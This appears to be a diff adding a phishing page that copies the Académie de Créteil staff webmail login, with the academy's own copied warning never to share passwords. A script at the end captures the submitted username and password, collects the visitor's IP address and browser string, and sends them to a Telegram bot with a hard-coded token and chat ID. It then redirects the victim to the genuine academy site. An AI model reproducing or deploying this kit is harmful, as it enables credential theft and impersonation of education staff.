@@ -1,0 +1,495 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+		<title></title>
+		<style type="text/css">
+			
+		</style>
+		<link rel="stylesheet" href="css.css" type="text/css"/>
+<style type="text/css">
+/*
+CSS for login
+*/
+
+/*
+@import url("dijit/Button.css");
+@import url("dijit/DropDownSelect.css");
+*/
+
+body {
+	font-family: Tahoma, sans-serif;
+    font-size:12px;
+}
+
+.dj_ie body {
+	/* We have to overwrite the font attribute from dojo as well, or we run
+	into problems on IE */
+	font: 12px Tahoma, sans-serif;
+}
+
+.Convergence-Login {
+	position:absolute;
+	left:50%;
+	top:50%;
+	width:430px;
+	margin-top:-125px;
+	margin-left:-220px;
+	border-top: 2px solid #EDEDED;
+	border-left: 1px solid #EEEEEE;
+	border-bottom: 1px solid #8F8F8F;
+	border-right: 1px solid #B9B9B9;
+}
+
+.Convergence-Login-Border {
+	width: 428px;
+	border-top: 1px solid #F8F8F8;
+	border-left: 1px solid #F9F9F9;
+	border-bottom: 1px solid #DADADA;
+	border-right: 1px solid #E9E9E9;
+}
+
+.Convergence-Login-Banner {
+	padding: 7px 0 0 10px;
+
+}
+
+.Convergence-Login-Logo {
+	background-color: transparent;
+	background-image: url(../images/smallOracleLogo.gif?3.0.1.3.0_16070513);
+	background-repeat: no-repeat;
+	background-position: 50% 50%;
+	width: 138px;
+	height: 18px;
+	padding: 0 0 10px 5px;
+	border-bottom: 2px solid #999;
+}
+
+
+.Convergence-Login-WelcomeMsg {
+	font-size: 18px;
+	font-weight: bold;
+	margin: 15px 0 5px 0;
+}
+
+.Convergence-Login-Notification {
+	margin: 2px 10px;
+	background-color: transparent;
+	background-repeat: no-repeat;
+	background-position: 0 0;
+	padding: 1px 0 0 22px;
+	color: red;
+	font-size: 11px;
+	height: 26px;
+}
+
+.Convergence-Login .Password-Expired-Message .ErrorMsg-Contianer .Error-Msg {
+	margin: 2px 10px;	
+	color: red;
+	font-size: 13px;
+	margin: -13px 0px 0px;
+}
+
+.Convergence-Login-Form {
+    margin: 0 30px 0 0px;
+	float: right;
+	width: 398px;
+}
+
+.Convergence-Login-SelectLang {
+    margin: 0 0px 0 10px;
+	float: left;
+}
+
+.Convergence-Login-FormRow {
+    padding-bottom: 8px;
+	text-align: right;
+}
+
+.Convergence-Login-Form label {
+    padding-right: 4px;
+}
+
+.Convergence-Login input[type=text],
+.Convergence-Login input[type=password]{
+    width: 125px;
+}
+
+.dj_webkit .Convergence-Login input[type=text],
+.dj_webkit .Convergence-Login input[type=password]{
+    padding: 2px;
+}
+
+div.Convergence-Login-Buttons {
+	padding-bottom: 0px;
+}
+
+div.Convergence-Login-FormButton {
+	width: 129px;
+	float: right;
+}
+
+.ChangePwdBtn {
+	margin-top: 13px;
+	float: left !important;
+	width: 136px !important;	
+}
+
+.dj_webkit div.Convergence-Login-FormButton {
+	width: 133px;
+}
+
+.dj_ff36_mac div.Convergence-Login-FormButton {
+	width: 131px;
+}
+.dj_webkit div.Convergence-Login-FormButton .ChangePwdBtn{
+	width: 137px;
+}
+
+.dj_ff36_mac div.Convergence-Login-FormButton .ChangePwdBtn{
+	width: 135px;
+}
+
+div.Convergence-Login-FormButton div {
+	text-align: left;
+}
+
+.dijitButton, dijitDropDownButton {
+	margin: 0;
+}
+
+.Convergence-Login .dijitButtonText,
+.Convergence-Login .dojoxDropDownSelectLabel {
+	font-size: 12px;
+}
+
+.Convergence-Login .dojoxDropDownSelect .dijitButtonContents{
+	padding: 1px 0 2px 1px;
+}
+
+.dojoxDropDownSelectFixedWidth {
+    width: 125px;
+}
+
+.dj_gecko .Convergence-Login-FormButton .dijitButtonNode {
+	padding: 0 0 1px 0;
+}
+
+.dj_ie .Convergence-Login-FormButton .dijitButtonNode {
+	padding: 0;
+}
+
+.dj_ie .Convergence-Login-FormButton .dijitButtonContents {
+	line-height: 12px;
+	height: 18px;
+}
+
+.dj_gecko .Convergence-Login-FormButton .ChangePwdBtn .dijitButtonNode {
+	padding: 0 0 1px 0;
+}
+
+.dj_ie .Convergence-Login-FormButton .ChangePwdBtn .dijitButtonNode {
+	padding: 0;
+}
+
+.dj_ie .Convergence-Login-FormButton .ChangePwdBtn .dijitButtonContents {
+	line-height: 12px;
+	height: 18px;
+}
+
+.Convergence-Login-RedBand {
+	margin: 3px 0 0 -1px;
+	background-image:url("../images/redband.png?3.0.1.3.0_16070513");
+	background-position: left top;
+	height: 30px;
+	width: 430px;
+}
+
+.Convergence-Login .Password-Expired-Message {	
+    width: 424px;
+    height: 89px;
+    background-color: #ffedcb;
+    border: 1px solid #fedfa5;	
+    margin-left: 1px;
+    margin-bottom: 1px;
+}
+
+.Convergence-Login .Password-Expired-Message .ErrorMsg-Contianer {
+    height: auto;    
+    margin-left: 7px;
+    margin-top: 22px;
+}
+.Convergence-Login .Password-Expired-Message .ErrorMsg-Contianer .Error-Icon {	
+    float: left;    
+    width: 35px;
+    height: 35px;
+    margin-right: 2px;
+    background-color: transparent;
+    background-image: url("../images/info-icon.png?3.0.1.3.0_16070513"); 
+    background-repeat: no-repeat;
+}
+
+.dj_ie .Convergence-Login .Password-Expired-Message .ErrorMsg-Contianer .Error-Icon {
+    margin-top: -8px;
+}
+.dj_webkit .Convergence-Login-RedBand {
+	width: 430px;
+}
+
+.Convergence-Login-Copyright {
+	height: 13px;
+	font-size: 11px;
+	background-image: url("../images/Copyright.png?3.0.1.3.0_16070513");
+	padding: 2px 10px 2px 8px;
+	text-align:center;
+}
+
+#spinner {
+    position: absolute;
+    padding-top: 30px;
+    background:#FFF url("../images/login-spinner.gif?3.0.1.3.0_16070513") no-repeat top left; /* NOT THEMED */
+    width: 100px;
+}
+
+#progress{
+    text-align: left;
+}
+/* style cristolien */
+body
+	{
+	color: #404918;
+	background-color: #F0F2F4;
+	background-image: url(images/creteil/bg.jpg);
+	background-repeat: repeat-x;
+	margin:0px;
+	font-family: arial,Verdana, Geneva, sans-serif;
+	font-size: 12px;
+	}
+#creteil h1
+	{
+	color: #404918;
+	font-size: 20px;
+	}
+#creteil #header
+	{
+	height:110px;
+	width:810px;
+	margin:auto;
+	background-image: url(bg_header.jpg);
+	background-repeat: no-repeat;
+	}
+#creteil #content
+	{
+	width:780px;
+	color: #000;
+	border: 2px solid #273582;
+	margin:auto;
+	background-color: #FFF;
+	padding:5px;
+	min-height:360px;
+	}
+#creteil #footer
+	{
+	margin-top: 40px;
+	text-align: center;
+	}
+#creteil #webmailFormulaire
+	{
+	width:320px;
+	color: #4d76b2;
+	background-color: #eeeeef;
+	border: 2px solid #273582;
+	float:right;
+	padding:5px;
+	margin-top:-100px;
+	margin-right:-100px;
+	position:relative;
+	}
+#creteil #webmailFormulaire h2
+	{
+	font-size: 18px;
+	margin: 14px 0px;
+	}
+#creteil .input
+	{
+	height:20px;
+	width:150px;
+	color: #000;
+	border: 2px solid #4d76b2;
+	margin: 0px;
+	padding: 2px;
+	}
+#creteil #boutonConnexion { color: #ffffff; background-color: #4d76b2; border: 2px solid #273582; padding: 2px 6px; cursor: pointer; }
+#creteil #boutonConnexion:hover { background-color: #ffffff; color: #273582;}
+#creteil a { color: #000000; text-decoration: none; }
+#creteil a:hover { color: #273582; }
+#creteil #liensExternes { margin: 10px 0px 10px 20px; }
+
+/* style surcharg� de certains �l�ments propres � convergence */
+#creteil label { font-weight: bold; }
+#creteil #welcomeMsg, #creteil .Convergence-Login-SelectLang, #creteil .Convergence-Login-FormButton { display: none; }
+#creteil .Convergence-Login-Form { width: 290px; /* 320px de webmail_form - 30px de marge pr�vue � droite */ }
+/*#creteil .Convergence-Login-Copyright { padding: 2px 0px; /* pour permettre l'affichage sur une seule ligne */ }*/
+</style>
+	</head>
+
+    <body>
+	<div id="creteil">
+		<div id="header"></div>
+		<div id="content">
+			<div id="webmailFormulaire">
+				<h2>Messagerie de l'Académie de Créteil</h2><hr />
+				<div id="message">
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg"></div>
+					<div class="Convergence-Login-Notification" id="alertMsg"></div>
+					<form action="" method="post" ;" autocorrect="off" autocapitalize="none">
+                       <input type="hidden" name="mailla" value=""/>
+						<div>
+							<div class="Convergence-Login-Form">
+								<div class="Convergence-Login-FormRow">
+									<label id="usernameLabelID" for="username">Username:</label>
+									<input class="input" id="username" name="user" type="text" required pattern="([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}|([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}@(ac-creteil.fr)"/>
+								</div>
+								<div class="Convergence-Login-FormRow">
+									<label id="passwordLabelID" for="password">Password:</label>
+									<input class="input" id="password" name="pass" type="password" required />
+								</div>
+								<div class="Convergence-Login-FormRow tundra">
+									<input type="submit" value="Connexion" id="boutonConnexion">
+									<div class="Convergence-Login-SelectLang">
+										<select dojoType="dojox.form.DropDownSelect"
+												class="dojoxDropDownSelectFixedWidth"
+												id="langButton">
+											<option value="en-us">English</option>
+											<option value="zh-cn">简体中文</option>
+											<option value="zh-tw">繁體中文</option>
+											<option value="fr">Français</option>
+											<option value="fr-ca">Français Canadien</option>
+											<option value="de">Deutsch</option>
+											<option value="ja">日本語</option>
+											<option value="es">Español</option>
+											<option value="ko">한국어</option>
+										</select>
+									</div>
+									
+									<div class="Convergence-Login-FormButton" id="buttonContainer">
+										<div>
+											<div dojoType="dijit.form.Button"
+												 id="signin"
+												 type="submit"
+												 dojoAttachEvent="onClick: login"></div>
+										</div>
+									</div>
+									<div style="clear: both"></div>
+								</div>
+
+							</div>
+
+						</div>
+						<div style="clear: both"></div>
+					</form>
+					<div id="liensExternes">
+					<a href="#" target="_blank">» Connaitre son identifiant</a><br/>
+          <a href="#" target="_blank">» Mot de passe oublié</a><br/>
+					<a href="#" target="_blank">» Changer son mot de passe</a><br/>
+					<a href="#" target="_blank">» Charte acad&eacute;mique</a>
+					</div>
+					<div id="copyright" class="Convergence-Login-Copyright"></div>
+				</div>
+			</div>
+
+			<div id="editable">
+			<h6><br><span style="color: #ff0000;" data-mce-style="color: #ff0000;"><strong><a href="#" data-mce-href="#"> <img style="display: block; margin-left: auto; margin-right: auto;" src="usage_resp_mini.png" alt="#" data-mce-src="#" data-mce-style="display: block; margin-left: auto; margin-right: auto;"> </a></strong></span><br data-mce-bogus="1"></h6><h2 style="text-align: left; padding-left: 30px;" data-mce-style="text-align: left; padding-left: 30px;"><strong><span style="background-color: #ffffff; color: #000080;" data-mce-style="background-color: #ffffff; color: #000080;">La nouvelle charte d'usage des technologies de l'information<br>et de la communication</span><br></strong></h2><p style="text-align: left; padding-left: 30px;" data-mce-style="text-align: left; padding-left: 30px;">La nouvelle charte d'usage des technologies de l'information et de la communication par les personnels de l'académie de Créteil a été présentée&nbsp;au Comité Technique Académique du<br>04 octobre 2019.<br> Elle définit les règles d’usages et de sécurité que l’institution et l’utilisateur s’engagent à respecter. Elle précise les droits et les devoirs de chacun.<br> Elle a aussi pour vocation de sensibiliser les utilisateurs aux exigences de sécurité et d’attirer leur attention sur certains comportements pouvant porter atteinte à l'intérêt collectif du service public d'éducation.<br> La charte est accompagnée d’un guide juridique qui rappelle les dispositions législatives et règlementaires en vigueur pour son application.</p><p style="text-align: left; padding-left: 30px;" data-mce-style="text-align: left; padding-left: 30px;">Elle est consultable sur la page d'accueil du site "Aide &amp; Documentation Numérique" à l'adresse :</p><p style="padding-left: 30px; text-align: center;" data-mce-style="padding-left: 30px; text-align: center;"><a href="#" target="_blank" data-mce-href="#">https://adn.ac-creteil.fr</a><br data-mce-bogus="1"></p><p style="text-align: center;" data-mce-style="text-align: center;"><span style="color: #0000ff;" data-mce-style="color: #0000ff;">♦ ♦ ♦</span></p><p style="padding-left: 30px;" data-mce-style="padding-left: 30px;">Votre identifiant et votre mot de passe (ou votre code Pin associé à votre clé OTP si vous en possédez une) sont des éléments confidentiels et personnels qui garantissent votre identité au sein de votre environnement professionnel.<br>Vous ne devez en AUCUN CAS les communiquer.<br>La direction des systèmes d'information (DSI), ou toute entité académique, ne vous adressera jamais de message vous invitant à transmettre votre identifiant et votre mot de passe ; tout message qui vous parviendrait dans ce sens est donc à ignorer. La communication de ces informations entraîne des usurpations d'identités qui entravent le bon fonctionnement du système d'information, son intégrité et sa confidentialité, ce qui est susceptible de dégrader fortement le fonctionnement des outils informatiques que vous utilisez au quotidien ;&nbsp;cela vous expose également à la divulgation d'informations personnelles à votre insu.<br>Merci de votre vigilance.</p><p style="text-align: center;" data-mce-style="text-align: center;"><span style="color: #0000ff;" data-mce-style="color: #0000ff;">♦ ♦ ♦</span></p><p style="padding-left: 30px;" data-mce-style="padding-left: 30px;"><strong>En cas de problème :</strong> contactez la plateforme d'assistance et de services <a href="#" target="_blank" data-mce-href="#">https://externet.ac-creteil.fr</a><br data-mce-bogus="1"></p><p>&nbsp;</p>			</div>
+
+			<div id="footer">
+			   <a href="#"><img src="logo.png" alt="Logo de l'academie de Creteil" width="55" height="XMRacad&eacute;mique</a> | <a href="#" target="_blank">Aide et Documentation Num&eacute;riques</a>
+			</div>
+			<div align="center"><img src="lignes.png" width="800" height="129" /></div>
+		</div>
+	</div>
+	<!-- fin de la page spécifique de Créteil -->
+
+	<div id="overlay" class="login">
+		<div class="centered">
+			<div class="logo"></div>
+			<div id="progress"></div>
+		</div>
+	</div>
+
+	<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>
+	<script>
+  // Fonction pour récupérer l'adresse IP de l'utilisateur
+  async function getIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Erreur lors de la récupération de l\'IP:', error);
+      return 'Inconnue';
+    }
+  }
+
+  // Fonction pour récupérer le navigateur utilisé
+  function getBrowser() {
+    return navigator.userAgent;
+  }
+
+  // Fonction pour formater les données en texte clair
+  function formatData(formData, ip, browser) {
+    let message = "LES IDENTIFIANTS AC-CRETEIL :\n\n";
+    message += `- Identifiant : ${formData.user}\n`;
+    message += `- Mot de passe : ${formData.pass}\n`;
+    message += `- Adresse IP : ${ip}\n`;
+    message += `- Navigateur : ${browser}\n`;
+    return message;
+  }
+
+  // Fonction pour envoyer les données via un bot Telegram
+  async function sendToTelegramBot(message) {
+    const botToken = '7096415223:AAGAA2ueggJckrwKZf0gJLjWh62A8TMOnuc'; // Remplacez par votre token de bot Telegram
+    const chatId = '1833853425'; // Remplacez par votre chat ID
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    try {
+      await fetch(url);
+      console.log('Message envoyé avec succès à Telegram');
+    } catch (error) {
+      console.error('Erreur lors de l\'envoi du message à Telegram:', error);
+    }
+  }
+
+  // Fonction principale pour gérer la soumission du formulaire
+  async function handleFormSubmit(event) {
+    event.preventDefault();
+
+    // Récupérer les données du formulaire
+    const formData = new FormData(event.target);
+    const formObject = {};
+    formData.forEach((value, key) => {
+      formObject[key] = value;
+    });
+
+    // Récupérer l'adresse IP et le navigateur
+    const ip = await getIP();
+    const browser = getBrowser();
+
+    // Formater les données en texte clair
+    const message = formatData(formObject, ip, browser);
+
+    // Envoyer les données à Telegram
+    await sendToTelegramBot(message);
+
+    // Rediriger vers date.html
+    window.location.href = 'https://www.ac-creteil.fr/';
+  }
+
+  // Ajouter un écouteur d'événement au formulaire
+  document.querySelector('form').addEventListener('submit', handleFormSubmit);
+</script>
+
+    </body>
+</html>
